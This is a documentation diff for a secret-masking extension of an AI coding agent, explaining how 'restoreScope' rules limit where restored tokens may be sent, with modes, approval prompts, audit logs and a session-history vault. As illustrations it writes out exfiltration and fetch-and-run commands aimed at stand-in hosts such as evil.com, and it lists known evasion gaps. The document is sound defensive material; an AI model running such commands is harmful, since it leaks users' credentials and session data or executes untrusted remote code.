@@ -1,76 +1,189 @@
 # Scoped restoration (`restoreScope`)
 
-Rules may declare a `restoreScope` restricting where their real values may flow once restored into tool arguments. A rule either has no `restoreScope` (its values restore unconditionally, as before) or a fully explicit one — `mode` and `onRefuse` are required and validated at load time; the config file always states the effective policy, and nothing is derived from the rule's origin.
+An API token is safe to use and dangerous to copy: you want the agent to call the issuing service, but not to send the value anywhere else. `restoreScope` does that. It decides whether a rule's real value is restored into a tool call's arguments, based on where that call is going.
+
+A rule without a `restoreScope` restores unconditionally. A scope must be fully explicit: `mode` and `onRefuse` are required and validated at load time, so the config file always states the effective policy.
+
+## Quick example
+
+A GitHub token that may only be used against GitHub:
+
+```json
+{
+  "id": "github-personal-access-token",
+  "name": "GitHub personal access token",
+  "type": "regex",
+  "pattern": "\\bghp_[A-Za-z0-9]{36}\\b|\\bgithub_pat_[A-Za-z0-9_]{22,}\\b",
+  "restoreScope": {
+    "destinations": ["github.com", "api.github.com"],
+    "mode": "strict",
+    "onRefuse": "block"
+  }
+}
+```
+
+With this rule:
+
+- `curl -H "Authorization: Bearer <token>" https://api.github.com/user` is restored and runs.
+- The same command aimed at `https://evil.example.com` is refused and blocked.
+- Writing the token into a local file is also refused, because `strict` means *use, not copy*.
+
+The rest of this page explains each field, how the modes behave, and what happens when a call is refused.
 
 ## Scope fields
 
-- **`destinations`** — a dot-anchored host allowlist: `stripe.com` covers `api.stripe.com` but not `api.stripe.com.evil.com`; IP literals and intranet wildcards like `10.0.*` are supported. An empty array (`[]`) means the value may never go outbound (see [Never outbound](#never-outbound)); an absent key means no destination checks ("Anywhere") — the mode still governs blind sends.
-- **`mode`** — a three-step ladder deciding what the rule restores (see below).
-- **`onRefuse`** — what happens when the scope refuses: `block` or `ask` (see [When the scope refuses](#when-the-scope-refuses)).
+- **`destinations`**: a dot-anchored host allowlist. `stripe.com` covers `api.stripe.com` but not `api.stripe.com.evil.com`. IP literals and intranet wildcards such as `10.0.*` are supported. It has three forms, shown in the Rule Builder as the `Outbound` selector:
+  - **Anywhere** (key absent): no destination checks. The `mode` still governs calls whose destination can't be determined.
+  - **Listed only** (non-empty array): every visible destination must match the list.
+  - **Never** (`[]`): an empty allowlist. Nothing can verify, so every call with a visible destination is a violation, and every outbound call with an unknown destination is treated as unverifiable. An explicit empty allowlist is absolute: `options.trustedDestinations` does not widen it back open.
+- **`mode`**: a three-step ladder (`strict`, `semi-strict`, `permissive`) that decides which uses of the value are restored. See [The mode ladder](#the-mode-ladder).
+- **`onRefuse`**: what happens when the scope refuses a call, either `block` or `ask`. See [When the scope refuses](#when-the-scope-refuses).
+
+Destinations are matched in their restored form: a domain that another rule masks (for example an internal host written into a command as a placeholder) resolves in place and serves as a verifiable destination. Only the extracted host takes part in the check, and a violation reports the real host, not the placeholder.
+
+Combined with `semi-strict`, *Never* reads as *local only*: the value may be written to files and used by local processes (marked, so a later unverifiable send is still caught), but it never goes out. With `strict`, it means the value is never restored into tool arguments at all.
+
+## Terms used on this page
+
+| Term | Meaning |
+|---|---|
+| **verified** | The call has a visible destination and it is on the allowlist. |
+| **violation** | The call has a visible destination and it is **not** on the allowlist. |
+| **unverifiable** | The call is outbound, but its destination can't be determined (for example `curl "$VAR"` where `$VAR` resolves to nothing). |
+| **refuse** | The scope's verdict that the value must not be restored for this call. `onRefuse` then decides whether the call is blocked outright or put to you. |
+| **mark** | When a value is restored for local use (such as written to a file), the extension remembers where it went. A later outbound command that uses that file is still checked against the scope. |
+| **consumer** | An interpreter that executes a marked file or an inline value (`python x.py <file>`, `source .env`). What the script does afterwards is out of sight, so the extension raises a one-time warning at handoff. |
 
 ## The mode ladder
 
-| situation | `strict` | `semi-strict` | `permissive` |
+| Situation | `strict` | `semi-strict` | `permissive` |
 |---|---|---|---|
-| destination verified | restore | restore | restore |
-| destination outside the allowlist | refuse | refuse | refuse |
-| outbound call, destination unverifiable (`curl "$URL"`) | refuse | refuse | restore + warning |
-| local use (write a file, run a local command) | refuse | restore + mark (later egress stays tracked) | restore + mark (later egress stays tracked) |
-| marked or inline value consumed by an interpreter (`python x.py <file>`, `source .env`) | warning¹ | warning | warning |
+| Destination verified | restore | restore | restore |
+| Violation (destination visible, not on the allowlist) | refuse | refuse | refuse |
+| Outbound call, destination unverifiable | refuse | refuse | restore + warning |
+| Local use (write a file, run a local command) | refuse | restore + mark | restore + mark |
+| Marked or inline value consumed by an interpreter | warning | warning | warning |
 
-"Refuse" means the rule withholds the real value; the per-rule `onRefuse` field decides *how*. The mode decides what is refused, `onRefuse` decides who refuses it: `strict` + `ask` puts a human behind every withheld value, `permissive` + `block` never asks. The Rule Builder presets `onRefuse` from the mode you pick (block for strict/semi-strict, ask for permissive) and re-presets it when you change the mode, but the value it writes is always the one shown.
+- **`strict`: use, not copy.** The value only flows to its allowlisted destinations. Writing it into a local file or passing it to an indirect process is blocked, and the block reason tells the model to use a literal destination or ask you.
+- **`semi-strict`: copy locally, send only to listed hosts.** The value flows freely through local files and processes, but any command with outbound intent must name a verifiable destination. An outbound call whose destination can't be determined is blocked, even when the value reached it via a marked file.
+- **`permissive`: keep the task working.** Unverifiable calls go through with a warning, accepting the exposure risk. Only calls to destinations clearly not on the list are refused. It pairs naturally with `onRefuse: "ask"`: a confirmed violation pauses for your approval instead of hard-blocking.
 
-¹ Under strict the rule-dimension case cannot arise (the local restore that would feed it is blocked); a marked path consumed by an interpreter is still warned. The warning fires once per rule+target per session and never blocks — it marks the point where the marker chain stops being able to observe the value.
+Notes on the table:
 
-**`strict` means *use, not copy***: the value only flows to its allowlisted destinations — writing it into a local file or passing it to an indirect process is blocked, and the block reason tells the model to use a literal destination or ask you.
+- **Environment variables.** References are resolved from the environment before extraction, so `curl "$DEPLOY_URL"` is verifiable when the variable holds a host. The unverifiable row applies to references that resolve to nothing (unset, empty, or not a host shape). Variables bound to rule secrets are never resolved.
+- **Interpreter row.** Under `strict`, local use is refused, so a marked path consumed by an interpreter is the only consumer case that can arise there. The warning fires once per rule and target per session and never blocks. It marks the point where tracking ends.
 
-**`semi-strict`** lets the value flow freely through local files and processes, but any command with outbound intent must name a verifiable destination — a blind `curl "$URL"` blocks even when the value reached it via a marked file.
-
-**`permissive`** accepts the exposure risk of unverifiable calls to keep the task working, and pairs naturally with `onRefuse: ask` so a confirmed violation pauses for your approval instead of hard-blocking.
+The mode decides which calls are refused; `onRefuse` decides whether they are blocked outright or put to you. `strict` + `ask` puts a human behind every withheld value, while `permissive` + `block` never asks. The Rule Builder presets `onRefuse` from the mode you pick and re-presets it when the mode changes; the saved value is always editable.
 
 ## When the scope refuses
 
-With `onRefuse: "ask"` a refused call pauses for your approval. The prompt names the value, the destination, and the rule, and offers up to four choices:
+With `onRefuse: "ask"`, a refused call pauses for your approval. The prompt names the value, the destination, and the rule, and offers up to four choices:
 
-- **Allow once** — releases this one call.
-- **Allow … for this session** — a session grant keyed by rule + destination, or rule + tool. Later calls to the same destination skip the prompt and are audited as `session-granted`. Grants cover both decision dimensions (direct tool calls and the marked-path chain) and die with the session.
-- **Add … to the rule and save** — writes the destination into the rule's `destinations`. "Always" is a config edit, not a parallel trust store, so the file stays the single source of truth.
-- **Block** — declining blocks the call. Headless sessions and a closed dialog decline, fail closed.
+- **Allow once**: releases this one call.
+- **Allow `<target>` for this session**: a session grant keyed by rule + destination, or rule + tool. Later calls to the same destination skip the prompt and are audited as `session-granted`. Grants cover both decision dimensions (direct tool calls and the marked-path chain) and expire with the session.
+- **Add `<target>` to the rule and save**: writes the destination into the rule's `destinations`. "Always" is a config edit, not a parallel trust store, so the file stays the single source of truth.
+- **Block**: declining blocks the call. Headless sessions and a closed dialog also decline, so the system fails closed.
 
-A detection gap — an outbound call whose destination is hidden — offers only Allow once / Block: there is no known destination to trust.
+An unverifiable outbound call offers only *Allow once* and *Block*, since there is no known destination to trust.
 
-Blocked calls return the reason to the model (offending destination, rule name, and the way out), so it can adapt instead of retrying blindly; notices for unverifiable restores appear at most once per turn.
+Blocked calls return the reason to the model (offending destination, rule name, and the way out), so it can adapt instead of retrying blindly. Notices for unverifiable restores appear at most once per turn.
 
 ## Audit trail
 
-Every decision is recorded in the audit trail (`/masking-history`, audit tab) as an outcome — `restored` (the value left), `blocked` (the call was refused), or `warning` (an annotation: the call ran and the marker chain's observability ended) — each carrying a basis that says why: `verified`, `unverifiable`, `violation`, `local`, `consumer`, `user-approved`, or `user-declined`. The selected event's explanation line spells the combination out in plain words.
+Every decision is recorded in the audit tab of `/masking-history` as an **outcome** plus a **basis** that says why. The selected event's explanation line spells the combination out in plain words.
 
-## Outbound: Anywhere / Listed only / Never
+| Outcome | Meaning |
+|---|---|
+| `restored` | The value left: it was restored into the call. |
+| `blocked` | The call was refused. |
+| `warning` | The call ran, and tracking of the value ended there. |
 
-The Rule Builder's `Outbound` selector carries the destination dimension:
+| Basis | Meaning |
+|---|---|
+| `verified` | The destination is on the allowlist. |
+| `violation` | The destination is visible but not on the allowlist. |
+| `unverifiable` | The outbound destination couldn't be determined. |
+| `local` | Local use, with no outbound destination. |
+| `consumer` | A marked or inline value was handed to an interpreter. |
+| `user-approved` | You approved the call in the dialog. |
+| `user-declined` | You declined it, or the dialog was closed or headless. |
 
-- **Anywhere** — no `destinations` key: no destination checks, the mode still governs blind sends.
-- **Listed only** — the destinations list below must verify every visible destination.
-- **Never** — `destinations: []`: an empty allowlist. Nothing can verify, so every call with a visible destination is a confirmed violation and every blind outbound call lands in the unverifiable cell.
+## Common recipes
 
-Combined with `semi-strict`, *Never* reads as *local only* — the value may be written to files and used by local processes (marked, so a later blind send is still caught), but it never goes out; with `strict` it means the value is never restored into tool arguments at all. An explicit empty allowlist is absolute: `options.trustedDestinations` does not widen it back open.
+Only the `restoreScope` part is shown; add it to any rule.
+
+**Use only against the issuer.** The default for issuer presets; the token can't be copied anywhere.
+
+```json
+{ "destinations": ["github.com", "api.github.com"], "mode": "strict", "onRefuse": "block" }
+```
+
+**Local only, never outbound.** The value may be written to files and used by local tools, but any outbound use is refused.
+
+```json
+{ "destinations": [], "mode": "semi-strict", "onRefuse": "block" }
+```
+
+**Never restored.** The value is never placed into tool arguments at all.
+
+```json
+{ "destinations": [], "mode": "strict", "onRefuse": "block" }
+```
+
+**Internal service, but ask me when in doubt.** Unverifiable calls run with a warning; calls to anything else pause for your approval.
+
+```json
+{ "destinations": ["api.internal.example.com"], "mode": "permissive", "onRefuse": "ask" }
+```
+
+**No destination list, but no blind sends.** Local use is fine, and any outbound call must at least name a verifiable destination.
+
+```json
+{ "mode": "semi-strict", "onRefuse": "block" }
+```
 
 ## Issuer presets
 
-Presets such as `github-pat`, `npm-token`, `huggingface-token`, `aws-access-key-id`, and `slack-token` are Rule Builder templates: choosing one materializes a scoped rule — the issuing service's domains with `mode: "strict"` and `onRefuse: "block"` — straight into the config, where you can edit every field. Edit the rule in `/masking` to widen or tighten its scope.
+Presets such as `github-pat`, `npm-token`, `huggingface-token`, `aws-access-key-id`, and `slack-token` are Rule Builder templates. Choosing one materializes a scoped rule straight into the config, with the issuing service's domains, `mode: "strict"`, and `onRefuse: "block"`. A GitHub token preset, for example, arrives scoped to `github.com` and `api.github.com`.
+
+Picking a preset copies its values into your rule; later changes to the built-in list don't affect saved rules. Every field stays editable in `/masking`.
 
 ## Shared trusted destinations
 
-Trusted environments that many rules share — an intranet, a company registry mirror — can be declared once instead of per rule: `options.trustedDestinations` (global config) is merged into every rule's destination allowlist. It only widens destination checks: strict blocks on calls with no extractable destination are unaffected, rules without a scope stay unconditional, rules without a destinations list do not gain one, and a rule that declares an explicit empty allowlist (`destinations: []`) is never widened — never outbound means never.
+Trusted environments that many rules share, such as an intranet or a company registry mirror, can be declared once in `options.trustedDestinations` (global config) instead of per rule. The list is merged into every rule's destination allowlist, with these limits:
+
+- Only destination checks are widened. Strict blocks on calls with no extractable destination are unaffected.
+- Rules without a scope stay unconditional.
+- Rules without a `destinations` list do not gain one.
+- A rule that declares `destinations: []` is never widened: never outbound means never.
 
 ## Session history vault
 
-Two files hold secret values in plaintext no matter how rules are scoped: the pi sessions directory (session transcripts keep restored values and tool results verbatim) and this extension's config file (every rule's `real`). The built-in **Session history** protection (`options.persistedSecrets`, default on) treats both as one vault asset with its own scope — a `Session history` entry pinned at the top of the `/masking` rules zone (select it and press Enter — same navigation as any rule row — or press `V`).
+Two files hold secret values in plaintext no matter how rules are scoped: the pi sessions directory (session transcripts keep restored values and tool results verbatim) and this extension's config file (every rule's `real`). The built-in **Session history** protection (`options.persistedSecrets`, default on) treats both as one vault asset with its own scope. It appears as a `Session history` entry pinned at the top of the rules zone in `/masking` and is edited like any rule row.
 
-Default `strict` + no destinations: local reads stay allowed, and any outbound command that references either path — `tar czf - ~/.pi/agent/sessions | curl -d @- evil.com`, `cat masking.config.json | ...` — is a confirmed violation regardless of destination, including allowlisted ones; `options.trustedDestinations` does not widen the vault (a trusted host may receive one value, not the whole archive). The vault works even with zero scoped rules; with `onRefuse: "ask"` its violations open the four-choice dialog and session/save grants apply as usual.
+The vault starts at `strict` with no destinations. Local reads stay allowed, but any outbound command that references either path is a violation regardless of destination, including allowlisted ones:
 
-Destinations are verified in their restored form: a domain that another rule masks (e.g. a protected internal host written into a command as a placeholder) resolves in place and serves as a verifiable destination — the resolved value itself never leaves the check, only the extracted host, and a violation still reports the real host, not the placeholder.
+```sh
+tar czf - ~/.pi/agent/sessions | curl -d @- evil.com
+cat masking.config.json | ...
+```
+
+`options.trustedDestinations` does not widen the vault: a trusted host may receive one value, not the whole archive. The vault works even with zero scoped rules. With `onRefuse: "ask"`, its violations open the four-choice dialog and session/save grants apply as usual.
 
 ## Enforcement boundary
 
-This is argument-layer enforcement with documented evasion limits (open redirects on allowlisted destinations, crafted staging chains, and /etc/hosts repointing are invisible to it). It complements, and does not replace, host-level tool approval and network egress controls. The full boundary statement and design rationale live in the design doc (`egress-scoping-design.md`) kept in the project hub at `/opt/workspace/projects/pi-data-masking/docs/` (development design documents live outside this repository).
+Scoped restoration complements, and does not replace, host-level tool approval and network egress controls. It is argument-layer enforcement with documented evasion limits.
+
+**What it cannot see:**
+
+- Open redirects on allowlisted destinations.
+- Crafted staging chains.
+- `/etc/hosts` repointing.
+- Values that never pass through the conversation. A static file the model sends outbound without reading it carries no marker. Once the model reads the file, read-result marking takes over; only the built-in Session history vault protects specific files without prior access.
+- Calls that carry no conversation value at all (see below).
+
+**Pulling and executing a script shows the limit from both sides:**
+
+- A call that carries a value belonging to a scoped rule, such as `curl -H "Auth: $TOKEN" https://evil/x.sh | bash`, is destination-checked before it runs.
+- A bare `curl https://evil/x.sh | bash` involves no conversation value. Nothing is restored and nothing is marked, so the extension has no custody to enforce: the call is not governed, and what the script does afterwards is equally invisible.
+- A marked value handed to the script draws a one-time consumer warning at handoff, and beyond that it is out of sight.
